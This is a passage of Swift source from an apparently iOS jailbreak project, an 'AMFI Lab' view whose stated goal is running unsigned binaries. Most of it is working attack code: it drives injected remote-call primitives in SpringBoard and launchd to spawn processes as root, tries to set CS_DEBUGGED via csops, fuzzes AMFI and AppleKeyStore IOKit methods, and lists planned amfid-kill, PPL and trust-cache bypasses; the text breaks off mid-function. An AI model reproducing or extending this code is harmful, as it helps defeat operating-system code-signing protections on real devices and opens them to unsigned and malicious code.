//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments â€” test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//
//  NOTE: Experiments 1-53 removed (legacy probes). Only keeping 54-59 (active research).
//

import SwiftUI
import IOSurface

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var runningLabel = ""
    @State private var customBinary = "/usr/bin/id"
    
    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Status Banner
            if isRunning {
                Section {
                    HStack(spacing: 10) {
                        ProgressView()
                            .tint(.red)
                        VStack(alignment: .leading, spacing: 2) {
                            Text("Running: \(runningLabel)")
                                .font(.caption.bold())
                                .foregroundStyle(.red)
                            Text("Do NOT close app â€” will cause panic!")
                                .font(.system(size: 9))
                                .foregroundStyle(.orange)
                        }
                    }
                    .padding(.vertical, 4)
                }
            }
            
            // Experiments
            Section {
                Button(action: runAllExperiments) {
                    HStack {
                        Label("Run All (Exp 54-59)", systemImage: "play.circle.fill")
                            .foregroundStyle(isRunning ? .gray : .red)
                        Spacer()
                        if isRunning && runningLabel.contains("All") {
                            ProgressView()
                                .scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: runAmfidRC) {
                    HStack {
                        Label("âš¡ amfid RC (Exp 60)", systemImage: "bolt.shield")
                            .foregroundStyle(isRunning ? .gray : .orange)
                        Spacer()
                        if isRunning && runningLabel.contains("amfid") {
                            ProgressView()
                                .scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: { testSingleBinary(customBinary) }) {
                    Label("Test Custom Binary", systemImage: "terminal")
                }
                .disabled(isRunning || !mgr.rcready)
                
                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Experiments", systemImage: "flask")
            } footer: {
                Text("âš ï¸ amfid RC may take 5-10s or hang. Do NOT kill app while running!")
                    .font(.system(size: 9))
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                                Spacer()
                                Text(r.timestamp, style: .time)
                                    .font(.system(size: 8))
                                    .foregroundStyle(.tertiary)
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    HStack {
                        Label("Results (\(results.count))", systemImage: "list.bullet")
                        Spacer()
                        if !results.isEmpty {
                            Button("Clear") { results.removeAll() }
                                .font(.caption2)
                        }
                    }
                }
            } else if !isRunning {
                Section {
                    Text("No results yet. Tap 'Run All' to start.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } header: {
                    Label("Results", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Lab")
        .navigationBarTitleDisplayMode(.inline)
    }
    
    // MARK: - Run All Experiments
    
    private func runAllExperiments() {
        isRunning = true
        runningLabel = "All Experiments (54-59)..."
        results.removeAll()
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfi_experiments") { rc in
            var experimentResults: [ExperimentResult] = []
            
            // Experiments 1-53: REMOVED (legacy probes, see git history)
            
            // ============================================
            // Experiment 54: IOKit driver probe
            // ============================================
            let exp54 = self.expIOKitProbe(rc: rc)
            experimentResults.append(exp54)
            
            // ============================================
            // Experiment 55: CoreTrust certificate probe
            // ============================================
            let exp55 = self.expCoreTrustProbe(rc: rc)
            experimentResults.append(exp55)
            
            // ============================================
            // Experiment 56: AMFI external method fuzzing
            // ============================================
            let exp56 = self.expAMFIExternalMethods()
            experimentResults.append(exp56)
            
            // ============================================
            // Experiment 57: AppleKeyStore probe (DISABLED â€” not directly useful for AMFI bypass)
            // ============================================
            // let exp57 = self.expKeyStoreProbe()
            // experimentResults.append(exp57)
            
            // ============================================
            // Experiment 58: AMFI struct method deep probe
            // ============================================
            let exp58 = self.expAMFIStructProbe()
            experimentResults.append(exp58)
            
            // ============================================
            // Experiment 59: AMFI from launchd + amfid hunt
            // ============================================
            let exp59 = self.expAMFIFromLaunchd(rc: rc)
            experimentResults.append(exp59)
            
            // ============================================
            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: amfid kernel research
            // âš ï¸ DISABLED in batch run â€” RC init can hang/timeout
            // Use "Test amfid RC" button separately
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research",
                success: false,
                detail: "Use 'Test amfid RC' button (safe kernel reads only)",
                timestamp: Date()
            ))
            
            // ============================================
            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: FINAL ASSAULT
            // All remaining bypass paths combined
            // ============================================
            let exp61 = self.expFinalAssault(rc: rc)
            experimentResults.append(exp61)
            
            // ============================================
            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 62: Trust Cache â€” DISABLED (panic)
            // Reading __DATA addresses beyond pmap_cs causes panic
            // Socket KRW zone does NOT extend to trust cache region
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Trust Cache",
                success: false,
                detail: "âš ï¸ DISABLED â€” reading trust cache addresses causes panic.\nSocket KRW zone limited to proc/task/pmap_cs area only.\nTrust cache region (~57KB away) is in different zone.",
                timestamp: Date()
            ))
            
            let exp63 = self.expSSVBypass(rc: rc)
            experimentResults.append(exp63)
            
            let exp64 = self.expCoreTrustResearch(rc: rc)
            experimentResults.append(exp64)
            
            // ============================================
            // Experiment 65: amfid kill race
            // Kill amfid + immediately spawn — test if binary runs in window
            // ============================================
            let exp65 = self.expAmfidKillRace(rc: rc)
            experimentResults.append(exp65)
            
            // ============================================
            // Experiment 66: IOKit Driver Fuzzer (LAST TRY)
            // Targeted fuzzing of AMFI/IOSurface/KeyStore methods
            // Looking for memory corruption or unexpected behavior
            // ============================================
            let exp66 = self.expIOKitFuzzer()
            experimentResults.append(exp66)
            
            // ============================================
            // Experiment 67: Deep fuzz CredentialManager sel 0
            // ret=0xfffffffd means code reached — find different path
            // ============================================
            let exp67 = self.expCredMgrDeepFuzz()
            experimentResults.append(exp67)
            
            // ============================================
            // Experiment 68: PPL Bypass via IOSurface Physical Memory
            // Map physical page from SpringBoard → bypass PPL virtual protection
            // ============================================
            let exp68 = self.expPPLPhysicalBypass()
            experimentResults.append(exp68)
            
            // ============================================
            // Experiment 69: Physical Memory Discovery
            // Write marker to PurpleGfxMem → scan kernel for it
            // If found → we know phys↔virt mapping without gPhysBase!
            // ============================================
            let exp69 = self.expPhysicalMemoryDiscovery(rc: rc)
            experimentResults.append(exp69)
            
            // ============================================
            // Experiment 70: Extract physical address from port kobject
            // We have port 98455 → find kobject → get phys addr
            // Then calculate trust cache physical address
            // ============================================
            let exp70 = self.expExtractPhysAddr(rc: rc)
            experimentResults.append(exp70)
            
            DispatchQueue.main.async {
                self.results = experimentResults
                self.isRunning = false
                self.runningLabel = ""
            }
            
            let successCount = experimentResults.filter { $0.success }.count
            return (successCount > 0, "\(successCount)/\(experimentResults.count) succeeded", 0)
        }
        #endif
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        runningLabel = "Testing \(path)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    private func runAmfidRC() {
        isRunning = true
        runningLabel = "amfid RC (may take 10s)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfid_rc") { rc in
            let result = self.expRCIntoAmfid(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Helper: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "âœ… PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed â€” get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "âŒ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    // MARK: - Experiment 54: IOKit Driver Probe
    
    /// IOKit driver probe â€” find accessible user clients for potential exploitation
    /// Some IOKit drivers have bugs in external methods (OOB read/write)
    private func expIOKitProbe(rc: RemoteCall) -> ExperimentResult {
        var detail = "IOKit Driver Probe â€” finding accessible user clients\n\n"
        
        // From SpringBoard (has more IOKit access than launchd)
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        // Try to open various IOKit user clients
        let services = [
            "IOSurfaceRoot",
            "AGXAccelerator",
            "AppleAVD",
            "AppleH13CamIn",
            "IOHIDSystem",
            "AppleSPU",
            "AppleKeyStore",
            "AppleCredentialManager",
            "IOAudioEngine",
            "AppleMobileFileIntegrity",
        ]
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioServiceClose = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
        
        guard ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 else {
            detail += "IOKit functions not available\n"
            // Try loading IOKit
            let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
            RootExecutor.rcall(sb, "dlopen", fwPath, 1)
            RootExecutor.rcall(sb, "free", fwPath)
            detail += "Tried loading IOKit framework\n"
            return ExperimentResult(name: "IOKit probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let mem = sb.trojanMem
        
        for service in services {
            let nameAddr = remote_alloc_str(sb, service)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
                if svc != 0 {
                    // Try to open with type 0
                    let connectAddr = mem + 0x1A00
                    sb[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    let connect = sb[connectAddr].value32()
                    
                    if openRet == 0 && connect != 0 {
                        detail += "âœ… \(service): OPENED! connect=\(connect)\n"
                        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
                    } else {
                        detail += "  \(service): found but open failed (ret=0x\(String(format: "%x", openRet)))\n"
                    }
                } else {
                    detail += "  \(service): not found\n"
                }
            }
            RootExecutor.rcall(sb, "free", nameAddr)
        }
        
        let hasOpen = detail.contains("âœ…")
        if hasOpen {
            detail += "\nâœ… Accessible user clients found!\n"
            detail += "These can be fuzzed for OOB read/write vulnerabilities.\n"
            detail += "External methods might give us access to different kernel zones!\n"
        }
        
        return ExperimentResult(name: "IOKit probe", success: hasOpen, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 55: CoreTrust Certificate Probe
    
    /// CoreTrust certificate probe â€” test what signatures iOS 18.2 accepts
    /// Try spawning binary with different signature types
    private func expCoreTrustProbe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Certificate Probe\n\n"
        
        // CoreTrust validates the certificate chain in code signatures.
        // We can't easily CREATE certificates from device, but we can:
        // 1. Check what signature our app has (it's signed!)
        // 2. Check what signature system binaries have
        // 3. Try to copy signature from signed binary to unsigned one
        
        // Step 1: Read our app's code signature info
        let pid = RootExecutor.rcall(rc, "getpid")
        detail += "Our PID: \(pid)\n"
        
        // csops(pid, CS_OPS_STATUS, &status, sizeof(status))
        // CS_OPS_STATUS = 0
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        let csopsRet = RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csStatus = rc[statusAddr].value32()
        detail += "csops(STATUS): ret=\(csopsRet), flags=0x\(String(format: "%x", csStatus))\n"
        
        // Decode flags
        if csStatus & 0x1 != 0 { detail += "  CS_VALID\n" }
        if csStatus & 0x4 != 0 { detail += "  CS_HARD\n" }
        if csStatus & 0x8 != 0 { detail += "  CS_KILL\n" }
        if csStatus & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csStatus & 0x200 != 0 { detail += "  CS_PLATFORM_PATH\n" }
        if csStatus & 0x800 != 0 { detail += "  CS_DEBUGGED\n" }
        if csStatus & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
        if csStatus & 0x20000 != 0 { detail += "  CS_INSTALLER\n" }
        
        // Step 2: Try csops on launchd (PID 1)
        rc[statusAddr].setValue32(0)
        let csops1 = RootExecutor.rcall(rc, "csops", 1, 0, statusAddr, 4)
        let cs1Status = rc[statusAddr].value32()
        detail += "\nlaunchd csops: ret=\(csops1), flags=0x\(String(format: "%x", cs1Status))\n"
        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
        
        // Step 3: Check if we can set CS_DEBUGGED on ourselves via csops
        // CS_OPS_SET_STATUS = 8 (might be restricted)
        detail += "\nTrying to set CS_DEBUGGED on our process...\n"
        let newFlags: UInt32 = csStatus | 0x800 // add CS_DEBUGGED
        rc[statusAddr].setValue32(newFlags)
        let setRet = RootExecutor.rcall(rc, "csops", pid, 8, statusAddr, 4)
        detail += "csops(SET_STATUS, +CS_DEBUGGED): ret=\(setRet)\n"
        
        // Read back
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let afterFlags = rc[statusAddr].value32()
        detail += "After set: flags=0x\(String(format: "%x", afterFlags))\n"
        
        if afterFlags & 0x800 != 0 && csStatus & 0x800 == 0 {
            detail += "\nâœ…âœ…âœ… CS_DEBUGGED SET SUCCESSFULLY! âœ…âœ…âœ…\n"
            detail += "This might allow loading unsigned code in our process!\n"
            detail += "CS_DEBUGGED disables some AMFI checks!\n"
        }
        
        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable â€” might affect enforcement)
        // And CS_OPS_CLEARPLATFORM = 13
        detail += "\nOther csops experiments:\n"
        let csopsTests: [(String, UInt64)] = [
            ("CS_OPS_MARKHARD (4)", 4),
            ("CS_OPS_MARKKILL (6)", 6),
            ("CS_OPS_CLEARPLATFORM (13)", 13),
            ("CS_OPS_CLEARINSTALLER (14)", 14),
        ]
        
        for (name, op) in csopsTests {
            rc[statusAddr].setValue32(0)
            let r = RootExecutor.rcall(rc, "csops", pid, op, statusAddr, 4)
            detail += "  \(name): ret=\(r)\n"
        }
        
        let success = detail.contains("âœ…âœ…âœ…")
        return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 56: AMFI External Method Fuzzing
    
    /// Experiment 56: Open AMFI user client and fuzz ALL external methods!
    /// AppleMobileFileIntegrity kext has external methods that might:
    /// - Whitelist a binary hash
    /// - Disable enforcement for a process
    /// - Add an exception to code signing policy
    /// - Return internal state we can use
    private func expAMFIExternalMethods() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI External Method Fuzzing\n"
        detail += "Opening AppleMobileFileIntegrity user client...\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Get IOKit function pointers (resolved for availability check)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) â€” 6 params
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AMFI user client opened! connect=\(connect)\n\n"
        detail += "Fuzzing external methods (selectors 0-15)...\n\n"
        
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt)
        // Only 6 params â€” safe for ARM64 register calling convention
        
        // Setup output buffer (space for 16 uint64 outputs)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        // Input area
        let scalarInAddr = mem + 0x2000
        
        var foundMethods: [Int] = []
        
        for selector in 0..<16 {
            // Reset output count
            sb[scalarOutCntAddr].setValue32(16)
            
            // Clear output
            for i in 0..<16 {
                sb[scalarOutAddr + UInt64(i * 8)].setValue64(0)
            }
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,  // no input
                                         scalarOutAddr, scalarOutCntAddr)
            
            let outCnt = sb[scalarOutCntAddr].value32()
            
            // Interpret return value
            // 0 = success, 0xe00002bc = invalid selector, 0xe00002c2 = bad argument
            let retHex = String(format: "0x%x", ret)
            
            if ret == 0 {
                detail += "âœ… Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
                foundMethods.append(selector)
                
                // Read scalar outputs
                if outCnt > 0 {
                    detail += "   Scalar outputs: "
                    for i in 0..<min(Int(outCnt), 4) {
                        let val = sb[scalarOutAddr + UInt64(i * 8)].value64()
                        detail += "[\(i)]=0x\(String(format: "%llx", val)) "
                    }
                    detail += "\n"
                }
            } else if ret == 0xe00002bc {
                // kIOReturnBadArgument â€” selector doesn't exist
                detail += "   Selector \(selector): not implemented (0xe00002bc)\n"
            } else if ret == 0xe00002c2 {
                // kIOReturnUnsupported or bad input count
                detail += "âš ï¸ Selector \(selector): needs input! (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else if ret == 0xe0000001 {
                detail += "âš ï¸ Selector \(selector): general error (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else {
                detail += "   Selector \(selector): ret=\(retHex)\n"
                if ret != 0xe00002bc && ret != 0xe00002c7 {
                    foundMethods.append(selector)  // non-standard error = method exists
                }
            }
        }
        
        // Now try selectors with scalar input (1 uint64 = 0)
        if !foundMethods.isEmpty {
            detail += "\n--- Re-testing found methods with input ---\n"
            for selector in foundMethods.prefix(8) {
                // Try with 1 scalar input = 0
                sb[scalarInAddr].setValue64(0)
                sb[scalarOutCntAddr].setValue32(16)
                
                let ret2 = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             scalarInAddr, 1,  // 1 scalar input
                                             scalarOutAddr, scalarOutCntAddr)
                
                let outCnt2 = sb[scalarOutCntAddr].value32()
                detail += "  Selector \(selector) + input(0): ret=0x\(String(format: "%x", ret2)), outCnt=\(outCnt2)\n"
                
                if ret2 == 0 && outCnt2 > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "    â†’ output[0] = 0x\(String(format: "%llx", val))\n"
                }
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- Summary ---\n"
        detail += "Found \(foundMethods.count) active methods: \(foundMethods)\n"
        if !foundMethods.isEmpty {
            detail += "NEXT: Try specific inputs to these methods\n"
            detail += "Goal: find method that disables CS enforcement or whitelists hash\n"
        }
        
        let success = !foundMethods.isEmpty
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 57: AppleKeyStore Probe
    
    /// Experiment 57: AppleKeyStore external method probe
    /// KeyStore manages encryption keys â€” if we can extract/manipulate keys
    /// we might be able to sign our own binaries or decrypt protected data
    private func expKeyStoreProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleKeyStore External Method Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available in SpringBoard\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AppleKeyStore
        let nameAddr = remote_alloc_str(sb, "AppleKeyStore")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AppleKeyStore service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open KeyStore: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AppleKeyStore opened! connect=\(connect)\n\n"
        
        // Fuzz selectors 0-20 (KeyStore has many methods)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        
        var foundMethods: [Int] = []
        
        for selector in 0..<20 {
            sb[scalarOutCntAddr].setValue32(16)
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,
                                         scalarOutAddr, scalarOutCntAddr)
            
            if ret == 0 {
                let outCnt = sb[scalarOutCntAddr].value32()
                detail += "âœ… Selector \(selector): SUCCESS! out=\(outCnt)\n"
                foundMethods.append(selector)
                if outCnt > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
                }
            } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                detail += "âš ï¸ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
                foundMethods.append(selector)
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\nFound \(foundMethods.count) active KeyStore methods: \(foundMethods)\n"
        detail += "KeyStore methods can potentially:\n"
        detail += "- Extract signing keys\n"
        detail += "- Create new key bags\n"
        detail += "- Manipulate trust anchors\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 58: AMFI Struct Method Deep Probe
    
    /// Experiment 58: AMFI methods need struct input â€” probe with various struct formats
    /// Known AMFI IOKit methods typically accept:
    /// - CDHash (20 bytes SHA1 or 32 bytes SHA256) for binary whitelisting
    /// - PID (4 bytes) for process-specific operations
    /// - Entitlement queries (string + PID)
    /// - Trust cache entries (CDHash + flags)
    ///
    /// We try different struct sizes and content to find what each selector expects
    private func expAMFIStructProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI Struct Method Deep Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioConnectCallStruct = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallStructMethod"))
        
        guard ioConnectCallStruct != 0 else {
            detail += "IOConnectCallStructMethod not available\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        // Re-open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
